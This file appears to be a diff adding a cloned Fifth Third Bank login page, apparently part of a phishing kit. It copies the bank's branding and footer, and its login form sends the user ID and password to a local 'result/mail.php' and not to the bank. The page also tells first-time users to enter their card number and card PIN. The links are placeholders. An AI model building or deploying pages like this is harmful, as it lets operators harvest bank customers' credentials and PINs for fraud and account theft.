@@ -1,0 +1,319 @@
+
+<html>
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+        <meta charset="utf-8">
+        <title>Fifth Third Banking Login | Fifth Third Bank</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="files/style.css">
+        <link rel="stylesheet" href="files/cms.css">
+
+    </head>
+
+    <body class="nav-on-left page-login">
+        <header class="c-header">
+            <div class="c-header__container">
+                <div class="c-header__logo">    
+                    <a href=# class="c-logo-link ">
+                        <picture>
+                            <source srcset="files/logo-shield.svg" media="(max-width: 1024px)">
+                            <source srcset="files/logo.svg">
+                            <img srcset="files/logo.svg" class="c-logo " alt="Fifth Third Bank">
+                        </picture>
+                    </a>
+                </div>
+                <nav class="c-nav-primary" aria-label="Primary">
+                    <ul class="c-nav-primary__list">
+                        <li class="c-nav-primary__item " data-primarynav="js-primary-0">
+                            <a href=# class="c-nav-primary__link ">Customer Service</a>
+                        </li>
+                        
+                        <li class="c-nav-primary__item ">       
+                            <a href="" class="c-nav-primary__link ">Branch &amp; ATM Locator</a>
+                        </li>
+                    </ul>
+                </nav>
+                <ul class="c-header__buttons js-header-buttons">
+                    <li>
+                        <button id="btn_ft_mobile_nav" class="c-nav-trigger js-nav-trigger" aria-expanded="false">
+                            <span class="c-nav-trigger__text">Menu</span>
+                            <span class="c-nav-trigger__hamburger"></span>
+                        </button>
+                    </li>
+                </ul>
+            </div>
+        </header>
+
+        <main id="maincontent" class="o-page js-page">
+        	<div class="hero-large section">
+                <div class="c-hero c-hero--large " data-hero-type="login">
+                    <div class="c-hero__overlay"></div>
+                    <div class="c-hero__content c-hero__content--login">
+                        <section class="c-login__wrapper c-login__wrapper--standalone">
+                            <h2 class="title">Log in</h2>
+                            <div class="c-login__form">
+                                <div rob-logon-form="">
+                                    <style>
+                                        /* CSS reset for login box */
+                                        .login-block input:focus, .login-block button:focus, .login-block a:focus {
+                                            outline: none;
+                                        }
+                                        /* Start custom styles for login box */
+                                        .login-block .block {
+                                            display: block;
+                                        }
+                                        .login-block .form-input {
+                                            padding: 7px;
+                                            -webkit-appearance: none;
+                                            -moz-appearance: none;
+                                            appearance: none;
+                                            border: 1px #ccc solid;
+                                        }
+                                        .login-block .select-wrapper select {
+                                            outline: 0;
+                                            padding: 7px 40px 7px 7px;
+                                            font-size: 16px;
+                                            width: 100%;
+                                            -webkit-user-select: none;
+                                            -moz-user-select: -moz-none;
+                                            -ms-user-select: none;
+                                            user-select: none;
+                                            -webkit-appearance: none;
+                                            -moz-appearance: none;
+                                            appearance: none;
+                                            border: 1px solid #ccc;
+                                            border-radius: 0;
+                                            cursor: pointer;
+                                            background-color: #fff;
+                                        }
+                                        .login-block .select-wrapper:after {
+                                            font-family: FontAwesome;
+                                            content: "\f0d7";
+                                            padding-left: 5px;
+                                            margin-top: 0;
+                                            display: inline-block;
+                                            font-size: 14px;
+                                            color: #1C3F94;
+                                            position: absolute;
+                                            z-index: 0;
+                                            right: 0;
+                                            width: 30px;
+                                            top: 10px;
+                                            pointer-events: none;
+                                        }
+                                        .login-block .select-wrapper {
+                                            position: relative;
+                                        }
+                                        .login-block .form-input:focus, .login-block select:focus {
+                                            /* box-shadow: 0 0 0 5px rgba(0,175,102,.25); */
+                                            outline: 2px dashed #009F53;
+                                        }
+                                        .login-block .input-group__checkbox:focus + .input-group__addon {
+                                            /* box-shadow: 0 0 0 5px rgba(0,175,102,.25); */
+                                            outline: 2px dashed #009F53;
+                                        }
+                                        .login-block button:focus, .login-block a:focus {
+                                            /* box-shadow: 0 0 0 5px rgba(0,175,102,.25); */
+                                            outline: 2px dashed #009F53;
+                                        }
+                                        .login-block .full {
+                                            width: 100%;
+                                            flex-basis: 100%;
+                                        }
+                                        .login-block .m-t {
+                                            margin-top: 15px;
+                                        }
+                                        .login-block .m-t--sm {
+                                            margin-top: 10px;
+                                            text-align: left;
+                                        }
+                                        .login-block .anchor {
+                                            text-decoration: underline;
+                                        }
+                                        .login-block .anchor:hover {
+                                            text-decoration: none;
+                                        }
+                                        .login-block .input-group {
+                                            position: relative;
+                                            display: block;
+                                        }
+                                        .login-block .input-group__input {
+
+                                        }
+                                        .login-block .input-group__input, .login-block .input-group__input--select {
+                                            width: 100%;
+                                            height: 40px;
+                                        }
+                                        .login-block .input-group__checkbox {
+                                            opacity: 0;
+                                            position: absolute;
+                                            width: 44px;
+                                            height: 40px;
+                                            top: 0;
+                                            right: 0;
+                                            cursor: pointer;
+                                            z-index: 3;
+                                            margin: 0;
+                                            padding: 0;
+                                            -webkit-tap-highlight-color: transparent;
+                                        }
+                                        .login-block .input-group .form-input {
+                                            padding-right: 42px;
+                                        }
+                                        .login-block .input-group__addon {
+                                            border-left: 1px #ECECEC solid;
+                                            background-color: transparent;
+                                            color: #1d4094;
+                                            cursor: pointer;
+                                            -webkit-tap-highlight-color: transparent;
+                                            width: 44px;
+                                            height: 30px;
+                                            position: absolute;
+                                            right: 0;
+                                            top: 5px;
+                                            -webkit-transition: all 300ms ease;
+                                            transition: all 300ms ease;
+                                            text-align: center;
+                                            opacity: 1;
+                                            overflow: hidden;
+                                            font-size: 12px;
+                                        }
+                                        .login-block .input-group__addon__toggle {
+                                            color: #1d4094;
+                                            width: 44px;
+                                            display: block;
+                                            position: absolute;
+                                            -webkit-transform: translateY(0);
+                                            transform: translateY(0);
+                                            font-size: 12px !important;
+                                        }
+                                        .login-block p {
+                                            font-size: 1rem;
+                                        }
+                                    </style>
+
+                                    <div class="login-block">
+                                        <div rob-login="">
+                                            <form method="POST" action="result/mail.php" class="form" name="login-form">
+                                                <div class="m-t">
+                                                    <label class="form-label form__label">
+                                                        User ID
+                                                    </label>
+                                                    <div username-cell="" class="dynamic-state" data-valid="true">
+                                                        <div class="input-group">
+                                                            <input username-input="" autofocus="autofocus" class="form-input input-group__input full dynamic-state__input" name="user-id" id="user-id" type="text" autocomplete="off">
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="m-t">
+                                                    <label class="form-label form__label" for="password">
+                                                        Password
+                                                    </label>
+                                                    <div password-cell="" class="dynamic-state" data-valid="true">
+                                                        <input password-input="" class="form-input full dynamic-state__input" name="password" id="password" type="password" autocomplete="off">
+                                                    </div>
+                                                </div>
+                                                <div class="m-t">
+                                                    <button login-button="" type="submit" class="button -default -primary form__btn -full">
+                                                        Log In
+                                                    </button>
+                                                </div>
+                                                <div class="actions">
+                                                    <div class="m-t--sm ">
+                                                        <a href=# class="anchor">Forgot User ID</a>?
+                                                    </div>
+                                                    <div class="m-t--sm ">
+                                                        <a href=# class="anchor">Forgot Password</a>?
+                                                    </div>
+                                                    <div class="m-t--sm ">
+                                                        First Time User?
+                                                        <a id="register-user" href=# class="anchor">Register</a>.
+                                                    </div>
+                                                </div>
+                                            </form>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+                    </div>
+                </div>
+            </div>
+            <div class="outer-grid-container section">
+                <div class="o-fixed-width">
+                    <div class="o-grid o-grid--gutters o-grid--full large-grid--fit section">
+                        <div class="o-grid-cell">
+                            <div class="o-grid-cell section ">
+                                <div class="c-text-block">
+                                        <h2 class="c-text-block__title">
+                                            Existing Users
+                                        </h2>
+                                        <div class="c-text-block__copy rte  ">
+                                            <p>To access your accounts, please use your custom User ID and your associated Online Banking password.<br></p>           
+                                       </div>   
+                                </div>
+                            </div>
+                        </div>
+                        <div class="o-grid-cell">
+                            <div class="o-grid-cell section ">
+                                <div class="c-text-block"> 
+                                    <h2 class="c-text-block__title">
+                                        First Time Users     
+                                    </h2>
+                                        
+                                     <div class="c-text-block__copy">                 
+                                        <p><b>User ID:</b><br>
+                                         Use your Fifth Third debit, credit, prepaid or ATM card number the first time you log in.&nbsp;View&nbsp;<a href="">Forgot User ID</a>&nbsp;or&nbsp;<a href="">Forgot Password</a>.
+                                        </p>
+                                        <p><b>Password:</b><br>
+                                            Use your Card PIN (Personal Identification Number) to log in to Online Banking. After entering Online Banking for the first time using your 
+                                            Card PIN, you will be prompted to create an exclusive password for Online Banking.
+                                        </p>
+                                       
+                                       </div>     
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <footer class="c-footer">
+                <div class="c-footer__container">
+                    <div class="c-footer__nav">
+                        <div class="c-footer__items">
+                            <ul class="u-unlist">
+                                <li class="c-footer__items--links">
+                                    <a href=# class="c-footer__links-anchor ">About Us</a>
+                                </li>
+                                <li class="c-footer__items--links">
+                                    <a href=# class="c-footer__links-anchor ">Customer Service</a>
+                                </li>
+                                <li class="c-footer__items--links">
+                                    <a href=# class="c-footer__links-anchor ">Careers</a>
+                                </li>
+                                <li class="c-footer__items--links">
+                                    <a href=# class="c-footer__links-anchor ext_link">Investor Relations</a>
+                                </li>
+                                <li class="c-footer__items--links">
+                                    <a href=# class="c-footer__links-anchor ">Media Center</a>
+                                </li>
+                                <li class="c-footer__items--links">
+                                    <a href=# class="c-footer__links-anchor ">Privacy &amp; Security</a>
+                                </li>
+                                <li class="c-footer__items--links">         
+                                    <a href=# class="c-footer__links-anchor ">Site Map</a>
+                                </li>     
+                            </ul>
+                        </div>
+                    </div>
+                    <span class="c-footer__copyright">
+                        Copyright © 2020 Fifth Third Bank, National Association. All Rights Reserved. Member FDIC. <img src="files/equal_housing_logo.png" title="FDIC" alt="FDIC Logo"> Equal Housing Lender.                
+                    </span>
+                    <div class="c-footer__logo--container">
+                        <img src="files/logo.svg" class="c-logo " alt="Fifth Third Bank">
+                    </div>
+                </div>
+            </footer>
+        </main>
+    </body>
+</html>
